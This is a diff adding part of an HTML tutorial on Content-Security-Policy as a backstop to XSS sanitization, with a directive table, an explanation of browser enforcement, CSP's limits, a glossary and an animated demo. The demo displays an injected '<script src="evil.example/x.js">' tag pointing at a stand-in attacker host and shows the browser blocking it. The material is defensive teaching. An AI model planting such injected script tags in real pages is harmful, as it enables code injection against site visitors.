+        <tr><td class="gold">connect-src</td><td>fetch / XHR / WebSocket / EventSource targets</td><td class="hl">'self' https://api…</td><td>Caps exfiltration destinations even if a script does run.</td></tr>
+        <tr><td class="gold">font-src</td><td>@font-face sources</td><td class="hl">'self'</td><td>Rarely a security-critical directive, but still worth pinning.</td></tr>
+        <tr><td class="gold">frame-src</td><td>What this page may embed in &lt;iframe&gt;</td><td class="hl">'none'</td><td>Different from frame-ancestors — this governs embedding <em>others</em>.</td></tr>
+        <tr><td class="gold">frame-ancestors</td><td>Who may embed <em>this</em> page</td><td class="hl">'none'</td><td>Modern, CSP-native replacement for X-Frame-Options.</td></tr>
+        <tr><td class="gold">object-src</td><td>&lt;object&gt;/&lt;embed&gt;/&lt;applet&gt;</td><td class="hl">'none'</td><td>Legacy plugin content — block it unless you have a real reason not to.</td></tr>
+        <tr><td class="gold">base-uri</td><td>Allowed values for &lt;base href&gt;</td><td class="hl">'self'</td><td>Prevents relative-URL hijacking via injected &lt;base&gt; tags.</td></tr>
+        <tr><td class="gold">form-action</td><td>Allowed form submission targets</td><td class="hl">'self'</td><td>Stops credential-harvesting redirects even without script execution.</td></tr>
+        <tr><td class="gold">upgrade-insecure-requests</td><td>Auto-upgrade http:// subresources to https://</td><td class="hl">(no value)</td><td>Cleans up legacy mixed-content links without rewriting every URL.</td></tr>
+        <tr><td class="gold">report-uri / report-to</td><td>Where violation reports are POSTed</td><td class="hl">/csp-report</td><td>Turns CSP from silent enforcement into a live intrusion signal.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout cyan reveal">
+    <div class="callout-title">📌 Start in Report-Only Mode</div>
+    Deploying a strict CSP cold, in enforcing mode, on a real production app is a good way to break things you didn't know depended on inline scripts. The header <code>Content-Security-Policy-Report-Only</code> enforces nothing — it just sends violation reports to your <code>report-uri</code> so you can see exactly what a real policy would have blocked, before you flip the switch that actually blocks it.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 6: HOW ENFORCEMENT WORKS -->
+<section id="enforcement">
+<div class="container">
+  <div class="section-num">06 — Under the Hood</div>
+  <h2>How the Browser <span class="accent p">Actually Enforces</span> This</h2>
+
+  <p class="reveal">CSP isn't a suggestion parsed lazily somewhere in the middle of page load. The browser reads the <code>Content-Security-Policy</code> header the moment the response headers arrive — before the HTML body has even started streaming in — and holds that parsed policy for the life of the document. From that point forward, every single resource-fetching decision the page makes gets checked against it.</p>
+
+  <div class="pipeline reveal">
+    <div class="pipe-stage"><div class="pipe-icon">📡</div><div class="pipe-name">Response Arrives</div><div class="pipe-desc">CSP header parsed before HTML parsing begins</div></div>
+    <div class="pipe-arrow">→</div>
+    <div class="pipe-stage"><div class="pipe-icon">📄</div><div class="pipe-name">HTML Parsed</div><div class="pipe-desc">DOM built, including any injected tags</div></div>
+    <div class="pipe-arrow">→</div>
+    <div class="pipe-stage"><div class="pipe-icon">🚦</div><div class="pipe-name">Fetch Requested</div><div class="pipe-desc">Script, style, image, frame, or connect attempted</div></div>
+    <div class="pipe-arrow">→</div>
+    <div class="pipe-stage"><div class="pipe-icon">🔍</div><div class="pipe-name">Directive Matched</div><div class="pipe-desc">Origin checked against the relevant source list</div></div>
+    <div class="pipe-arrow">→</div>
+    <div class="pipe-stage"><div class="pipe-icon">✅❌</div><div class="pipe-name">Allow or Block</div><div class="pipe-desc">Load proceeds, or is silently refused + logged</div></div>
+  </div>
+
+  <p class="reveal">If a resource fails the check, the browser doesn't just quietly skip it — it fires a <code>SecurityPolicyViolationEvent</code>, writes a descriptive error to the DevTools console (something like <code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'"</code>), and — if <code>report-uri</code> or <code>report-to</code> is configured — POSTs a structured JSON report describing exactly what was blocked and why.</p>
+
+  <div class="compare-grid reveal">
+    <div class="compare-card good">
+      <h4>✅ Header (Recommended)</h4>
+      Delivered as an HTTP response header, present before the parser starts on the body. Covers <em>every</em> directive, including <code>frame-ancestors</code> and <code>report-uri</code>, which have no <code>&lt;meta&gt;</code> equivalent at all.
+    </div>
+    <div class="compare-card bad">
+      <h4>⚠️ &lt;meta http-equiv&gt; (Partial)</h4>
+      Useful when you can't control server headers (static hosting), but only applies from that point in the document onward — anything requested earlier in <code>&lt;head&gt;</code> is unprotected, and several directives simply aren't supported this way.
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- SECTION 7: LIMITS -->
+<section id="limits">
+<div class="container">
+  <div class="section-num">07 — Setting Expectations</div>
+  <h2>What CSP <span class="accent r">Does Not</span> Do</h2>
+
+  <p class="reveal">It's worth being precise about the boundary here, because CSP is powerful but not magic.</p>
+
+  <ul class="reveal">
+    <li>CSP does not <em>prevent</em> HTML injection — attacker-controlled markup can still land in the DOM. It only limits what that markup is allowed to <em>execute or load</em>.</li>
+    <li>CSP does not fix SQL injection, server-side request forgery, authentication bugs, or any vulnerability class that doesn't route through the browser's resource-loading decisions.</li>
+    <li>CSP does not replace proper output encoding — it's a backstop for when encoding fails, not a substitute for doing it right in the first place.</li>
+    <li>CSP can be configured into uselessness. A policy that includes <code>'unsafe-inline'</code> on <code>script-src</code> permits exactly the inline injected scripts CSP exists to stop — collapsing this entire layer of protection back to zero.</li>
+  </ul>
+
+  <div class="callout orange reveal">
+    <div class="callout-title">👀 Coming Up: When the Allowlist Itself Is the Weak Point</div>
+    Even a strict, well-formed <code>script-src</code> allowlist with no <code>'unsafe-inline'</code> can still be bypassed — not by breaking CSP's enforcement, but by finding a way to smuggle attacker-controlled content through a source that's already on the trusted list. The companion deep-dive, <em>CSP Bypass Techniques, and Why Nonces/Hashes Beat Allowlists</em>, walks through exactly how that happens, and why authenticating the script itself — not just where it claims to load from — is the fix.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 7b: WHY IT MATTERS IN PRACTICE -->
+<section id="practice">
+<div class="container">
+  <div class="section-num">07b — Tying It Together</div>
+  <h2>Why This <span class="accent p">Layered</span> Thinking Matters</h2>
+
+  <p class="reveal">Security engineers call this pattern <strong>defense in depth</strong>: instead of betting everything on one control being flawless forever, you stack independent controls so that one failing doesn't mean total compromise. XSS defense is a textbook case of why that matters — because the two layers fail in genuinely different ways.</p>
+
+  <div class="stat-grid reveal">
+    <div class="stat-card"><div class="val">🧵</div><div class="lbl">Sanitization fails per-endpoint, one bug at a time</div></div>
+    <div class="stat-card"><div class="val">🛡️</div><div class="lbl">CSP fails per-policy, all at once — easier to audit</div></div>
+    <div class="stat-card"><div class="val">🔍</div><div class="lbl">CSP violations are logged; missed escaping usually isn't</div></div>
+    <div class="stat-card"><div class="val">♻️</div><div class="lbl">One correct header protects every future template too</div></div>
+  </div>
+
+  <p class="reveal">That last point is easy to undervalue. Sanitization has to be re-applied correctly by every developer, on every new feature, forever. A well-configured <code>script-src</code>, once shipped, protects code that <em>hasn't even been written yet</em> — the next contributor who adds a new endpoint with a subtle escaping bug is still covered by the same header that's already deployed. That's what makes CSP worth the deployment effort even in a codebase that already takes sanitization seriously: it's the one control that keeps working when a human, somewhere, inevitably makes a mistake.</p>
+
+  <div class="callout green reveal">
+    <div class="callout-title">✅ The One-Sentence Summary</div>
+    <strong>Sanitization tries to keep an attacker's script out of your HTML; CSP is the browser-enforced guarantee that even if it gets in, it doesn't get to run — two independent layers, so one imperfect layer doesn't mean the whole defense collapses.</strong>
+  </div>
+</div>
+</section>
+
+<!-- SECTION 8: GLOSSARY -->
+<section id="glossary">
+<div class="container">
+  <div class="section-num">09 — Quick Reference</div>
+  <h2>Glossary &amp; <span class="accent p">Key Terms</span></h2>
+
+  <div class="glossary-grid reveal">
+    <div class="glossary-card"><div class="glossary-term">XSS (Cross-Site Scripting)</div><div class="glossary-def">An attacker getting their own JavaScript to execute in the context of a page it shouldn't — via injected HTML that the browser parses and runs as if it belonged there.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Reflected XSS</div><div class="glossary-def">Payload arrives in the request (a query parameter, form field) and is echoed back unescaped in the immediate response.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Stored XSS</div><div class="glossary-def">Payload is saved server-side and re-rendered, unescaped, for every subsequent visitor — no crafted link required.</div></div>
+    <div class="glossary-card"><div class="glossary-term">DOM-based XSS</div><div class="glossary-def">Payload never touches the server; the page's own client-side JavaScript reads attacker-controlled data and writes it unsafely into the DOM.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Content-Security-Policy (CSP)</div><div class="glossary-def">An HTTP response header that tells the browser which sources of scripts, styles, images, frames, and connections are allowed to load or execute on a page.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Directive</div><div class="glossary-def">One clause of a CSP policy (like script-src or img-src) governing one category of resource, followed by its list of allowed sources.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Source List (Allowlist)</div><div class="glossary-def">The space-separated set of origins, keywords, or schemes a directive permits — everything not on the list is refused.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Sanitization / Output Encoding</div><div class="glossary-def">Transforming untrusted data so it can't be interpreted as markup or code in the context it's written into — the first line of XSS defense, and the one CSP backstops.</div></div>
+    <div class="glossary-card"><div class="glossary-term">default-src</div><div class="glossary-def">The fallback source list applied to any fetch directive not explicitly specified in the policy.</div></div>
+    <div class="glossary-card"><div class="glossary-term">SecurityPolicyViolationEvent</div><div class="glossary-def">The DOM event the browser fires whenever a CSP directive blocks a load — the hook used to build custom violation logging in addition to report-uri.</div></div>
+    <div class="glossary-card"><div class="glossary-term">HttpOnly Cookie</div><div class="glossary-def">A cookie attribute that hides the cookie's value from JavaScript entirely — a complementary defense that limits what a successful XSS payload can steal, independent of CSP.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Content-Security-Policy-Report-Only</div><div class="glossary-def">A header variant that enforces nothing but sends violation reports as if it did — the standard way to test a new policy's real-world impact before switching to enforcing mode.</div></div>
+  </div>
+
+  <p class="reveal" style="margin-top:1.5rem;">Keep this glossary within reach for the companion deep-dive — every term here reappears there, applied to the specific ways a seemingly strict allowlist can still be walked around by an attacker who never has to break CSP's enforcement logic at all.</p>
+</div>
+</section>
+
+<footer>
+  <p>Content-Security-Policy: Defense in Depth After Sanitization Fails · companion lesson for <a href="../../browser/B13_csp/tutorial.html">bob_os/browser module B13_csp</a></p>
+  <p style="margin-top:.5rem;font-size:.78rem">The browser doesn't stop the injection. It stops the injection from mattering.</p>
+</footer>
+
+<script>
+const C={bg:'#060d1a',bg2:'#0b0f1a',bg3:'#1a2235',border:'#1e3a5f',gold:'#f5c842',cyan:'#38bdf8',teal:'#0d9488',red:'#f87171',green:'#4ade80',purple:'#a78bfa',muted:'#7a9bbf',orange:'#fb923c',text:'#e2e8f0'};
+
+function dpr(canvas,w,h){const d=window.devicePixelRatio||1;canvas.width=w*d;canvas.height=h*d;canvas.style.width=w+'px';canvas.style.height=h+'px';const ctx=canvas.getContext('2d');ctx.scale(d,d);return ctx;}
+function gW(c){return c.parentElement.getBoundingClientRect().width;}
+
+// ── CSP GATEKEEPER CANVAS ────────────────────────────────────────────────────
+function drawCSPScene(t,phase,kind){
+  const canvas=document.getElementById('cspCanvas');
+  const W=gW(canvas),H=320;
+  const ctx=dpr(canvas,W,H);
+  ctx.fillStyle=C.bg;ctx.fillRect(0,0,W,H);
+
+  const leftX=0, leftW=W*0.34, wallX=leftW, wallW=W*0.22, rightX=leftW+wallW, rightW=W-rightX;
+  const evil = kind==='evil';
+  const zoneCol = evil?C.red:C.green;
+
+  // left zone: page HTML
+  ctx.fillStyle='rgba(56,189,248,.06)';ctx.fillRect(leftX,20,leftW,H-70);
+  ctx.strokeStyle=C.cyan;ctx.lineWidth=1.5;ctx.strokeRect(leftX+2,20,leftW-4,H-70);
+  ctx.fillStyle=C.cyan;ctx.font='bold 12px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('PAGE HTML',leftX+leftW/2,40);
+  ctx.font='10px Source Code Pro,monospace';ctx.fillStyle=zoneCol;
+  const scriptTag = evil ? '<script src="evil.example/x.js">' : '<script src="/app.js">';
+  wrapText(ctx, scriptTag, leftX+leftW/2, 70, leftW-16, 14);
+
+  // middle: CSP policy check wall
+  ctx.fillStyle='rgba(167,139,250,.08)';ctx.fillRect(wallX,20,wallW,H-70);
+  ctx.strokeStyle=C.purple;ctx.setLineDash([4,4]);ctx.strokeRect(wallX+1,20,wallW-2,H-70);ctx.setLineDash([]);
+  ctx.save();ctx.translate(wallX+wallW/2,H/2-20);ctx.rotate(-Math.PI/2);
+  ctx.fillStyle=C.purple;ctx.font='bold 10px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('CSP ALLOWLIST CHECK',0,0);ctx.restore();
+  ctx.fillStyle=C.muted;ctx.font='9px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText("script-src 'self'",wallX+wallW/2,H-90);
+  ctx.fillText('cdn.jsdelivr.net',wallX+wallW/2,H-78);
+
+  // right: result zone
+  ctx.fillStyle=evil ? 'rgba(248,113,113,.08)' : 'rgba(74,222,128,.08)';
+  ctx.fillRect(rightX,20,rightW,H-70);
+  ctx.strokeStyle=zoneCol;ctx.lineWidth=1.5;ctx.strokeRect(rightX+2,20,rightW-4,H-70);
+  ctx.fillStyle=zoneCol;ctx.font='bold 12px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText(evil?'BLOCKED':'EXECUTES',rightX+rightW/2,40);
+
+  const captions={
+    idle:'Click a button to try loading a script',
+    parse:'Browser parses the HTML — finds a <script> tag',
+    check:'Browser checks the script’s origin against script-src before running it',
+    result: evil
+      ? "Origin doesn't match the allowlist — browser refuses to execute, logs a console error"
+      : "Origin matches 'self' — browser proceeds to fetch and execute it normally"
+  };
+  ctx.fillStyle=C.text;ctx.font='12px Lato,sans-serif';ctx.textAlign='center';
+  ctx.fillText(captions[phase]||'',W/2,H-16);
+  ctx.font='10px Lato,sans-serif';ctx.fillStyle=C.muted;
+  if(phase==='result'){
+    const sub = evil ? 'console: Refused to execute script — violates script-src' : 'console: (no violation)';
+    ctx.fillText(sub,W/2,H-32);
+  }
+
+  let dotX=leftX+leftW*0.5, dotY=H/2-20, dotCol=C.cyan;
+  if(phase==='parse'){dotX=leftX+leftW*(0.3+0.4*t);dotY=H/2-20;dotCol=C.cyan;}
+  else if(phase==='check'){dotX=leftX+leftW*0.7+(wallW)*t;dotY=H/2-20;dotCol=C.purple;}
+  else if(phase==='result'){
+    if(evil){
+      dotX=wallX+wallW*0.8; dotY=H/2-20;
+      ctx.beginPath();ctx.arc(dotX,dotY,9,0,Math.PI*2);ctx.fillStyle=C.red;ctx.fill();
+      ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.stroke();
+      ctx.beginPath();ctx.moveTo(dotX-5,dotY-5);ctx.lineTo(dotX+5,dotY+5);ctx.moveTo(dotX+5,dotY-5);ctx.lineTo(dotX-5,dotY+5);
+      ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.stroke();
+      return;
+    } else {
+      dotX=rightX+(rightW*0.5)*t; dotY=H/2-20; dotCol=C.green;
+    }
+  }
+  ctx.beginPath();ctx.arc(dotX,dotY,8,0,Math.PI*2);ctx.fillStyle=dotCol;ctx.fill();
+  ctx.strokeStyle='#fff';ctx.lineWidth=1;ctx.stroke();
+}
+
+function wrapText(ctx,text,cx,y,maxW,lh){
+  const words=text.split(' ');
+  let line='',lines=[];
+  words.forEach(w=>{
+    const test=line?line+' '+w:w;
+    if(ctx.measureText(test).width>maxW && line){lines.push(line);line=w;}
+    else line=test;
+  });
+  if(line) lines.push(line);
+  lines.forEach((l,i)=>ctx.fillText(l,cx,y+i*lh));
+}
+
+function runCSP(kind){
+  const phases=['parse','check','result'];
+  const durations=[550,550,700];
+  let idx=0,start=performance.now();
+  document.getElementById('cspLabel').textContent = kind==='evil'
+    ? '▶ Running: injected script from evil.example'
+    : '▶ Running: legitimate same-origin script';
+  function step(now){
+    const elapsed=now-start;
+    const t=Math.min(1,elapsed/durations[idx]);
+    drawCSPScene(t,phases[idx],kind);
+    if(t>=1){
+      idx++;
+      if(idx>=phases.length){
+        document.getElementById('cspLabel').textContent='▶ Complete — click a button to run again';
+        return;
+      }
+      start=now;
+    }
+    requestAnimationFrame(step);
+  }
+  requestAnimationFrame(step);
+}
+function resetCSP(){
+  document.getElementById('cspLabel').textContent='▶ Watch the browser’s gatekeeper decide — click a button to run';
+  drawCSPScene(0,'idle','legit');
+}
+
+// ── SCROLL REVEAL ──────────────────────────────────────────────────────────────
+const obs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible');});},{threshold:.07});
+document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+const secs=document.querySelectorAll('section[id]');
+const dots=document.querySelectorAll('.toc-dot');
+const tocObs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){dots.forEach(d=>d.classList.remove('active'));const d=document.querySelector(`.toc-dot[href="#${e.target.id}"]`);if(d)d.classList.add('active');}});},{threshold:.4});
+secs.forEach(s=>tocObs.observe(s));
+
+window.addEventListener('load',()=>{ resetCSP(); });
+window.addEventListener('resize',()=>{ resetCSP(); });
+</script>
+</body>
+</html>
